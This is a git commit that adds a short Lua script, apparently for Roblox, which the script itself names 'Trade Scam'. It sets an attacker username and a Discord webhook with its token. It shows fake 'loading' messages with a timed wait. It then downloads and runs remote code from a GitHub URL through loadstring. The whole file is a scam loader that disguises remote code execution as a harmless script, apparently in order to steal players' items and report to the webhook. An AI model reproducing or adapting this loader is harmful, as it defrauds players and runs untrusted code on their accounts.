79f8c7c3f11a1250ec47cae3185b99f984cdeb12
Gia3010Q <112676031+Gia3010Q@users.noreply.github.com>
2023-05-10 20:33:17 +0700

    Create myscript.lua

---
+++ myscript.lua
@@ -0,0 +1,19 @@
+UserName = "Gia3010Q"
+
+UserName2 = "Gia3010Q"
+
+Webhook = "https://discord.com/api/webhooks/1105835847418384465/3q8tXeTVWqgMa-FA8KWUiSjdpd8LWK1OZ2b5EJKJB0TQ_A1ToA8e2Y_Lii-_1T9PG-yN"
+
+_G.AntiLeave = false
+
+_G.ScriptName = "Trade Scam"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script loading"
+
+_G.ThirdText = "Ready to run"
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
